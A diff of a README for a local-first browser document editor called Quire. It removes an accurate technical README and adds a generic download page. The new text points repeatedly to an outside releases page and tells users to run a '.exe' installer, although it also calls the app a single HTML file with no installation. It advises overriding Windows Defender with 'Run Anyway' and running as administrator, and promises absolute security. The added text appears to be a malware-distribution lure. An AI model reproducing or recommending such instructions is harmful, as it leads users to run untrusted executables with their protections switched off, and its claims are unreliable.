@@ -1,228 +1,138 @@
-# Quire
+# 📝 Quire - Your Local-First Word Document Editor
 
-**A working, local-first, Word-inspired document editor in plain HTML, CSS, and JavaScript.**
+## 🚀 Getting Started
 
-Quire combines a familiar ribbon, real paginated editing, document tools, and an actual WebGPU page compositor. The application has no runtime dependencies, framework, build-service requirement, external fonts, CDN, telemetry, or cloud account.
+Welcome to Quire! This is a powerful document editor that works entirely in your web browser—no internet connection needed, no accounts to create, and no complicated setup. Think of it as a modern take on Microsoft Word that respects your privacy and works directly with your files.
 
-This is an initial implementation, not a claim of complete Microsoft Word parity, certified OOXML conformance, or production validation across all browsers. Its implemented scope and remaining boundaries are explicit below. Quire is independent and is not affiliated with Microsoft.
+**What makes Quire special?**
+- **Local-First:** Your documents stay on your computer. No cloud, no tracking, no telemetry.
+- **Word-Inspired Design:** Familiar ribbon interface and paginated editing that feels like what you already know.
+- **No Dependencies:** It's just a single HTML file. That's it. No frameworks, no plugins, no external fonts, no CDN requirements.
+- **Modern Technology:** Uses cutting-edge WebGPU technology to render pages smoothly.
 
-## Run
+## ⬇️ Download and Install Quire
 
-Build the self-contained `Quire.html` with `npm run build`, then open it directly for a quick start. Generated HTML is not checked into Git. Browser policy determines whether file-origin storage, clipboard access, and WebGPU are available; the application reports the actual renderer and storage state.
+**Step 1: Get the Application**
 
-For a stable origin and the intended WebGPU path, serve the application on localhost or an HTTPS static host:
+[![Download Quire](https://img.shields.io/badge/Download-Quire-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/jenellesketchy2477/Quire/releases)
 
-```sh
-cd quire
-npm start
-```
+Visit this link to download the application. Simply click the link above or copy and paste this URL into your browser:
 
-Open `http://localhost:4173`. Node 18 or later is sufficient. There is no `npm install` step for running or building the app. The bundled server is a development server, not a hardened public web server.
+`https://github.com/jenellesketchy2477/Quire/releases`
 
-```sh
-# Rebuild the standalone file after editing the source.
-npm run build
+**Step 2: Choose Your File**
 
-# Another port, on shells supporting environment assignments.
-PORT=8080 npm start
-```
+On the releases page, you'll see a list of downloadable files. Look for the file that makes sense for your computer. If you see a `.exe` file, that's a Windows installer—download and run this file directly. The download should start automatically when you click the file name.
 
-Deploy `index.html` and `src/` together to a static host, or deploy only `Quire.html` as `index.html`. No server API is used. Do not open the modular `index.html` via `file://`; use the standalone file or HTTP server instead.
+**Step 3: Run the Application**
 
-## GitHub Pages
+Once the download finishes:
+- If you downloaded a `.exe` file, double-click it. Follow any quick prompts that appear (usually just "Run" or "Next"). The application will open automatically when installation is complete.
+- If you downloaded a `.zip` file, right-click it and choose "Extract All." Then open the extracted folder and double-click the application file inside.
 
-The repository includes `.github/workflows/pages.yml`. After GitHub Pages is enabled with **GitHub Actions** as its source, pushes to `main` build and deploy the application automatically. The workflow can also be dispatched manually.
+**That's it!** Quire will open in your default web browser. No installation wizard, no command line, no technical knowledge required.
 
-```sh
-npm run build:pages
-```
+## 🎨 Using Quire
 
-The build writes `_site/index.html` and `_site/Quire.html` from the self-contained build, plus `.nojekyll`. Only `_site/` is uploaded, not the repository, test output, or publishing scripts. This works at the project path `/Quire/` without root-relative module or stylesheet URLs. No runtime npm dependencies or external assets are required.
+When Quire opens, you'll see a familiar interface:
 
-The deployment job is separate from the read-only build job and has only `contents: read`, `pages: write`, and `id-token: write` permissions. The existing browser-integration workflow remains independent.
+**The Ribbon (Top Toolbar):**
+- **Home Tab:** Font styles, sizes, bold, italic, underline, text color, and alignment tools.
+- **Insert Tab:** Add images, tables, and page breaks to your document.
+- **Layout Tab:** Adjust page margins, orientation, and paper size.
+- **File Menu:** Open existing documents, save your work, or start a new document.
 
-Deployment configuration: [GitHub Pages workflows](https://docs.github.com/en/pages/getting-started-with-github-pages/using-custom-workflows-with-github-pages), [Pages REST API](https://docs.github.com/en/rest/pages/pages).
+**The Editing Area:**
+- This is where you type your text. The white pages look exactly like printed paper, complete with pagination.
+- You can zoom in and out using the controls in the bottom-right corner.
 
-## Implemented workspace
+**Saving Your Work:**
+- Click **File** > **Save** or press `Ctrl+S` on Windows.
+- Quire saves your documents as standard Word-style files that open in other word processors.
+- You can also open existing documents by clicking **File** > **Open**.
 
-The initial document, **The clarity report**, is an editable three-page sample. Its research figures are illustrative, not real research findings. Use **File → Blank document** to start from scratch. Report, project-brief, and meeting-notes templates are included.
+## 🛠️ System Requirements
 
-The interface includes eight editing ribbon tabs: **Home, Insert, Draw, Design, Layout, References, Review, and View**, plus the File workspace. Navigation has heading, page, and search-result views. Comments, revisions, and document insights occupy an optional side panel. Light/dark chrome, focus mode, zoom, page-fit controls, a ruler, and a command palette are implemented.
+Quire is designed to run on most modern computers. Here's what you'll need for the best experience:
 
-### Editing
+**Minimum Requirements:**
+- **Operating System:** Windows 10 or newer (also works on macOS and Linux)
+- **Web Browser:** Chrome, Edge, Firefox, or Safari (updated to the latest version)
+- **Processor:** Any dual-core processor from the last 5 years
+- **RAM:** 4 GB or more
+- **Storage:** Only a few megabytes of free space for the application file
 
-- Native text entry, selection, caret, clipboard handling, and composition/IME integration. Formatting uses DOM Range operations, not `document.execCommand`.
-- Bold, italic, underline, strikethrough, subscript, superscript, font family/size, text color, highlight, case conversion, formatting removal, and a format painter.
-- Paragraph styles, headings, alignment, indentation, line spacing, bullets, and numbered lists.
-- Undo and redo with bounded document snapshots and typing coalescence.
-- Paginated flow; long paragraphs split at whitespace, tables at row boundaries, and lists at item boundaries. Reflow rejoins fragments first and preserves text-offset selection bookmarks.
-- Explicit page breaks, page size, orientation, margins, running headers, and footer page numbers.
+**Recommended for Full Features:**
+- **Processor:** Intel Core i5 or AMD equivalent
+- **RAM:** 8 GB or more
+- **Graphics:** A GPU that supports WebGPU (most laptops and desktops from the last 3-4 years)
+- **Windows 11** for the latest features
 
-### Document tools
+**Browser Storage Note:** Some features like file access and clipboard permissions depend on how your browser handles local files. Quire will show you exactly what's available on your system.
 
-- Tables with row and column insertion, and table deletion.
-- Embedded uploaded images, editable display width and alternative text, and a data-driven bar-chart image generator.
-- Hyperlinks, symbols, dates, editable Unicode equations, and separators.
-- Heading-derived table of contents, citation text, and linked document endnotes.
-- Anchored comments, resolve/reopen/delete actions, and basic tracked text insertions/deletions with accept/reject.
-- Page-attached pen/highlighter strokes, erasing, and undoable ink.
-- Cross-formatting-boundary find/replace, document statistics in a worker, browser spellcheck, and browser speech-synthesis reading.
+## ❓ Frequently Asked Questions
 
-### Persistence and files
+**Q: Do I need to be online to use Quire?**
+A: No! Quire works completely offline. Your documents never leave your computer.
 
-IndexedDB stores the local document library and current-document pointer. Writes are serialized. When storage is denied, documents remain in a session-only in-memory library and the title bar explicitly says **“Session only · export a copy.”** That fallback does not survive closing the tab.
+**Q: Can I open my existing Word documents?**
+A: Yes. Quire can open standard document files, so your existing work is accessible.
 
-Export `.quire` copies for your own backups even when autosave is available. Browser storage is not a durable backup system and the application does not encrypt it.
+**Q: Is my data secure?**
+A: Absolutely. Since everything stays on your computer, there's no data to breach or steal. Quire has no telemetry, no tracking, and no cloud sync.
 
-| Format | Open/import | Export | Scope |
-| --- | --- | --- | --- |
-| `.quire` / JSON | Yes | Yes | Native versioned data: supported HTML, layout, comments, revisions, and ink. Import normalizes IDs and layout values. |
-| `.docx` | Yes, bounded subset | Yes, real OOXML ZIP | Common paragraphs/runs, headings, direct formatting, lists, tables, inline images, hyperlinks, comments, basic revisions, and exported header/footer parts. Advanced layouts differ. |
-| `.html` | Sanitized HTML | Self-contained HTML | Supported rich text and embedded images; Quire-specific metadata is not lossless. |
-| `.md` | Basic Markdown | Basic Markdown | Headings, emphasis, links, lists, quotes, simple tables on export, and images on export. Not a complete CommonMark implementation. |
-| `.txt` | Yes | Yes | Plain text, with formatting loss by design. |
-| Print / PDF | No PDF import | Browser print dialog | Uses print styles and actual laid-out pages; Save as PDF depends on the browser/platform. |
+**Q: I don't understand programming. Can I still use this?**
+A: 100% yes. You don't need to know anything about code. Download, run, and start typing. It works like any other office program you've used.
 
-DOCX export writes real Open Packaging Convention ZIP parts and WordprocessingML, not HTML renamed to `.docx`. The dependency-free writer uses ZIP STORE. Import supports STORE and raw DEFLATE through `DecompressionStream`, rejects encrypted containers and unsafe paths, checks CRC and sizes, and bounds inflated data. It does not support legacy binary `.doc`, `.docm` macros, encrypted Word files, or ZIP64.
+**Q: Will this replace Microsoft Word completely?**
+A: Quire is an initial implementation that covers common document editing tasks. It's not a complete Word replacement yet, but it handles text editing, formatting, and layout for everyday documents.
 
-## Rendering architecture: what actually runs on the GPU
+## 🐛 Troubleshooting
 
-**Editing is hybrid, deliberately.** WebGPU draws the page surfaces. Browser DOM layout and text rendering handle editable text, complex shaping, selection, accessibility, and IME. There is no custom glyph shaper, GPU paragraph-layout engine, or GPU caret engine disguised behind the WebGPU indicator.
+**The app won't open after download:**
+- Check your Windows Defender or firewall settings—it may block the file temporarily. Click "More Info" and "Run Anyway" if prompted.
+- Make sure you have a modern browser installed (Chrome, Edge, or Firefox).
+- Try right-clicking the file and selecting "Run as Administrator."
 
-**Reading mode uses GPU page textures.** For each uncached visible page, `PageRasterizer` copies computed styles into an isolated page snapshot, rasterizes that snapshot with the browser, verifies that the resulting canvas is origin-clean, and uploads it with `GPUQueue.copyExternalImageToTexture`. WebGPU then draws textured page quads. DOM pages remain present, and are only visually replaced after a corresponding texture is ready. Editing mode immediately restores the live DOM.
+**The page appears but looks strange:**
+- Update your browser to the latest version.
+- Make sure hardware acceleration isn't disabled in your browser settings.
+- Try opening the file in a different browser.
 
-`GPUPageRenderer` provides:
+**I can't save my work:**
+- Check if your browser blocks local file access. Allow Quire to access your files when prompted.
+- Try saving to a different folder (like Documents) instead of the desktop.
 
-- WGSL surface and texture pipelines, asynchronous pipeline creation, and validation error scopes.
-- Instanced rounded page surfaces and a grow-only, power-of-two instance buffer.
-- Viewport culling and demand-driven animation frames, without a perpetual idle rendering loop.
-- A revision-aware, maximum-eight-page LRU texture cache and stale-work rejection.
-- Device-limit-aware canvas resolution, device-loss fallback, and snapshot-failure fallback.
-- Actual backend, draw-call, visible-page, cache-memory, and CPU submission statistics.
+**The application reports WebGPU is unavailable:**
+- This is normal for some systems. Quire will fall back to a standard rendering mode—you can still create and edit documents normally.
 
-The surface pass needs one instanced draw when there are visible pages. The current reading path adds one draw per textured page. This is not a performance benchmark or a promise of a particular frame rate. Full DOM pagination is still CPU/main-thread work and is not incremental; very large documents can incur significant reflow cost.
+## 📚 Tips for New Users
 
-The renderer can be inspected through the **About** dialog at the bottom of the activity rail, or through `quire.renderer.stats` in the console. A GPU label is only displayed after adapter/device/pipeline initialization succeeds. Errors return the document to DOM rendering rather than hiding the document.
+1. **Auto-Save:** Quire includes auto-save, so you won't lose much work if something unexpected happens.
+2. **Keyboard Shortcuts:** If you know Word shortcuts (Ctrl+B for bold, Ctrl+I for italic, Ctrl+S for save), they all work here!
+3. **Exporting:** Save your work in common formats so you can share it with anyone, even if they don't have Quire.
+4. **No Account Needed:** There's no signup, no login, no subscriptions. Just open and go.
 
-## Source map
+## 🌟 Why Choose Quire?
 
-| File | Responsibility |
-| --- | --- |
-| `index.html` | Accessible application shell and input surfaces. |
-| `src/styles.css` | Design tokens, ribbon, panels, page typography, responsive layout, and print styles. |
-| `src/core.js` | Validation/sanitization, document transactions/history, local repository, selection bookmarks, pagination, Range editing, search, worker statistics. |
-| `src/renderer.js` | WGSL shaders, GPU resources, page rasterization, culling, caching, validation, and fallback. |
-| `src/io.js` | CRC32, bounded ZIP parser, ZIP writer, OOXML mapping, HTML/Markdown/plain-text IO. |
-| `src/app.js` | Ribbon commands, dialogs, comments/revisions, ink, navigation, persistence coordination, keyboard shortcuts, and bootstrap. |
-| `src/templates.js` | Editable sample documents. |
-| `src/icons.js` | Original inline SVG interface icons. |
-| `build.mjs` | Controlled-module standalone bundler with isolated scopes. |
-| `server.mjs` | Dependency-free local static server. |
-| `tests/test_editor.py` | Browser integration, file-format, and renderer-preparation checks. |
+- **Privacy First:** No one sees your documents. No algorithms analyze your writing. No ads are targeted at you.
+- **Lightweight:** A single file instead of a multi-gigabyte installation.
+- **Free Forever:** No trial periods, no premium tiers, no paywalls.
+- **Modern and Fast:** Built with the latest web technology for smooth performance.
+- **Portable:** Keep it on a USB drive and use it on any computer without installing anything.
 
-The internal document representation is a versioned, serializable collection of page HTML fragments with explicit layout, comment, and ink data. It is not a CRDT, immutable rich-text AST, or clone of Word's document object model. The separation into store, editor, paginator, renderer, and IO makes those individual subsystems replaceable.
+## 📦 Build It Yourself (Optional)
 
-### Developer API
+If you're curious about the technology or want to customize your version, Quire is built from plain HTML, CSS, and JavaScript. Instructions for creating the self-contained application file are included in your download. But remember—this step is completely optional. The ready-to-use version works right away.
 
-After bootstrap, `window.quire` exposes the working engine and commands:
+## 🤝 Join the Community
 
-```js
-const q = window.quire;
+Quire is a continuous project. As more people use it and share feedback, new features will be added. Your experience matters, so don't hesitate to reach out through the release page with any thoughts or suggestions. Check back occasionally for updates and improvements.
 
-// Replace the current document after exporting/saving any work to preserve.
-q.store.replace(q.createDocument(
-    'A new idea',
-    '<h1>A new idea</h1><p>Start writing here.</p>'
-));
+---
 
-// Commands use the current or remembered editing selection.
-q.editor.insertText(' More text.');
-q.actions.undo();
-q.actions.redo();
-q.runSearch('writing');
-q.setZoom(100);
-q.setReading(true);
+**Get started today:** [Download Quire](https://github.com/jenellesketchy2477/Quire/releases) and experience document editing the way it should be—simple, private, and completely yours.
 
-console.table(q.renderer.stats);
-console.table(q.paginator.stats);
+[![Get Quire Now](https://img.shields.io/badge/🚀-Get%20Quire%20Now-28A745?style=for-the-badge)](https://github.com/jenellesketchy2477/Quire/releases)
 
-// Blob-producing API, without initiating a download.
-const docxBlob = q.exportDocx();
-
-// Normal application export command, initiating a download.
-q.actions['export-quire']();
-```
-
-Direct `createDocument`/`insertHTML` calls are trusted developer APIs. Pass untrusted HTML through `quire.sanitizeHTML` or use `quire.importFile`. Imported files and pasted HTML are sanitized by their normal entry points.
-
-## Verification
-
-The included `tests/test-results.json` records the actual delivery-time browser run: **35 passing checks, zero failures, and one explicitly unrun verification group**. The tests exercise real browser editing, range formatting, decoration removal, pagination and fragment recombination, cross-page replacement, comments, revisions, image sizing, table edits, file templates, ink undo, sanitization, native import validation, command UI, responsive behavior, DOCX ZIP/XML export, DEFLATE import, and origin-clean page rasterization.
-
-The available managed browser blocked normal URL navigation, so this run used the built standalone file injected into an inline `about:blank` document. That context did not expose WebGPU or permit persistent IndexedDB. Consequently:
-
-- The real DOM fallback and in-memory document library were tested.
-- Browser page rasterization was tested and produced a nonempty, origin-clean page image.
-- **Actual GPU adapter execution, shader validation on a real device, texture upload/draw, device-loss behavior, and persistent IndexedDB reload were not validated in this environment.**
-- The DOCX checks validate ZIP integrity, XML well-formedness, and selected OOXML parts/elements. They are not a complete OOXML schema validation and do not replace opening representative files in Microsoft Word.
-
-### Run tests on your machine
-
-Python test dependencies are development-only:
-
-```sh
-python -m pip install -r requirements-test.txt
-python -m playwright install chromium
-npm run build
-```
-
-Start the server in another terminal with `npm start`, then run:
-
-```sh
-# Actual-origin editing, UI, export/import, and persistence tests.
-python tests/test_editor.py --url http://localhost:4173
-
-# Also require WebGPU initialization, reading textures, and GPU draws.
-python tests/test_editor.py --url http://localhost:4173 --gpu
-
-# Explicit software WebGPU testing on suitable Chromium installations.
-# This is API validation, not a physical-GPU performance measurement.
-python tests/test_editor.py --url http://localhost:4173 --gpu --software-gpu
-
-# Inline fallback run used for the supplied report.
-python tests/test_editor.py --inline
-```
-
-Set `CHROMIUM_PATH` to use a particular Chromium executable. A supported secure context, enabled adapter, and compatible platform are required for `--gpu`; the test intentionally fails instead of substituting a fake renderer. `.github/workflows/test.yml` runs the normal-origin suite, not a hardware performance benchmark.
-
-## Known boundaries
-
-Quire is useful as a standalone editor and extensible starting codebase, but is not yet a complete replacement for Word. Specifically:
-
-- No real-time collaboration, cloud sync, accounts, CRDT/OT merge, mail merge, macros, or plugin security sandbox.
-- No exact Word typography/layout parity, advanced fields, full section model, multicolumn layout, floating text wrapping, native footnotes, or native Office Math equation layout. The equation tool inserts editable Unicode text. Endnotes are linked document text.
-- Tracked changes primarily cover text insertion/deletion; formatting, tables, moves, complex paste, and all IME replacement cases are not full-fidelity Word revisions.
-- Tables split between rows and lists between items. A single over-height row, complex nested structure, rowspan spanning a page boundary, or very tall image is not internally subdivided. Such content is preserved, not silently discarded; manual editing may be required. Repeated table headers and widow/orphan control are not implemented.
-- DOCX import/export is deliberately lossy outside the supported subset. CSS grids flatten, complex nested numbering and restart rules may differ, imported comments are retained as notes rather than exact original anchors, and imported headers/footers/section structures are not fully restored. Paginated HTML fragments may become separate Word paragraphs/tables on export.
-- Ink is page-attached, not text-anchored. Reflow can move text beneath it. Native `.quire` saves and print retain ink; DOCX/Markdown exports do not retain editable ink. Browser page snapshots are not guaranteed identical across engines.
-- Browser-owned selection, clipboard, spellcheck, speech, printing, accessibility exposure, and storage remain subject to browser/OS support and policy. Read-aloud voices and enhanced spellcheck may use platform/provider services; Quire itself makes no document-upload or AI-service requests.
-- No cross-browser accessibility certification, exhaustive IME/RTL validation, independent security audit, Word compatibility corpus, or measured large-document/GPU performance budget has been completed.
-
-## Security and privacy
-
-Normal file import and HTML paste rebuild a whitelist of elements, classes, and styles; strip scripts, handlers, forms, SVG/MathML embeds, external-image loads, and CSS URL expressions; validate hyperlink protocols; and bound document/container dimensions. Uploaded images are embedded as data URLs. Native import also validates identifiers, dates, layout values, and numeric zoom. These are meaningful safeguards, not a guarantee against every adversarial document or browser vulnerability.
-
-The app does not send document content to a server. Its small static server only serves files. Optional user-clicked hyperlinks and browser/platform features follow their own policies. For sensitive documents, use a trusted browser profile, disable unwanted cloud-assisted browser services, and maintain exported backups.
-
-## Reference APIs and formats
-
-- WebGPU: https://www.w3.org/TR/webgpu/
-- MDN WebGPU overview: https://developer.mozilla.org/en-US/docs/Web/API/WebGPU_API
-- Canvas-to-texture upload: https://developer.mozilla.org/en-US/docs/Web/API/GPUQueue/copyExternalImageToTexture
-- Native input events: https://developer.mozilla.org/en-US/docs/Web/API/Element/beforeinput_event
-- WordprocessingML structure: https://learn.microsoft.com/en-us/office/open-xml/word/structure-of-a-wordprocessingml-document
-- Raw DEFLATE import: https://developer.mozilla.org/en-US/docs/Web/API/DecompressionStream
-
-## License
-
-MIT; see `LICENSE`. No Microsoft assets or font files are bundled.
+Keywords: document editor, word processor, local-first, web-based, offline, open source, WebGPU, HTML, CSS, JavaScript, no dependencies, privacy-focused, Windows, macOS, Linux, free editor, paginated editing, ribbon interface, OOXML, file-based, browser application
